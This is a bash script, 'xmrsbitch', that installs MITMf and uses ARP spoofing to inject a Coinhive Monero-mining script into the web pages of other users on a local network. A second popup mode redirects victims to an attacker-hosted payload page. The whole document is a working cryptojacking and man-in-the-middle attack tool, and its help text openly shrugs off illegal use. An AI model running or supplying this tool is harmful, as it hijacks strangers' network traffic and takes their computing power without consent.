if [[ $1 == "--install" ]]; then
	apt-get update -y
	apt-get install mitmf -y
	pip install Twisted==15.5.0
	echo "FINISHED INSTALLING!"
	exit
fi

if [[ $1 == "--generate" ]]; then
	echo "<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('"$2"');miner.start();</script>" > ./payload.html
	echo
	echo "PLAYLOAD GENERATED! "
	echo "NOTE: Don't forget to run 'service apache2 start'"
	echo "Put payload.html in your root web server dir"
	exit
fi

if [ $# -eq "3" ]; then
	echo "Running xmrs bitch injection attack..."
	echo "<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('"$1"');miner.start();</script>" > /root/.miner_itm.html
	mitmf --inject --html-file /root/.miner_itm.html --spoof --arp --gateway $2 -i $3
	rm /root/.miner_itm.html
fi

if [[ $1 == "-p" && $# -eq '4' ]]; then
	echo "Running popup xmrs bitch attack..."
	PU='function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function dpu(){document.removeEventListener("click",pu);}function pu(){if(getParameterByName("pu")==1){return;}dpu();var params = ["height="+screen.height,"width="+screen.width,"fullscreen=yes","menubar=yes","resizable=yes","scrollbars=yes","status=yes","titlebar=yes","toolbar=yes"].join(",");if(document.location.href.includes("?")){window.open(document.location+"&pu=1", "_blank", params).moveTo(0,0);}else{window.open(document.location+"?pu=1", "_blank", params).moveTo(0,0);}window.location="http://'$4'/payload.html"}document.addEventListener("click",pu);'
	echo $PU > /root/.miner_popup.js
	mitmf --dns --inject --js-file /root/.miner_popup.js --spoof --arp --gateway $2 -i $3
	
	rm /root/.miner_popup.html
else
	echo	
	echo "xmrsbitch"
	echo "Dylan j greene"
	echo "laughingman"
	echo
	echo "i dont gave a flying fuck if you use this for  illegal use!"
	echo "(if chought u face jali time )"
	echo 
	echo "To install dependencies run:"
	echo "	./xmrsbitch.sh --install"
	echo
	echo "To use a simple miner injection attack run:"
	echo "	./xmrsbitch.sh <coinhive api key> <gateway ip> <interface name>"
	echo
	echo "----To use a popup miner attack----"
	echo
	echo "	First run:"
	echo "		./xmrsbitch.sh --generate <coinhive api key>"
	echo
	echo "and place payload.html into your web server root directory"
	echo
	echo "	Second run:"
	echo "		./xmrsbitch.sh -p <gateway ip> <interface name> <web server ip>"
        echo 
        echo " have fun lads "

fi 
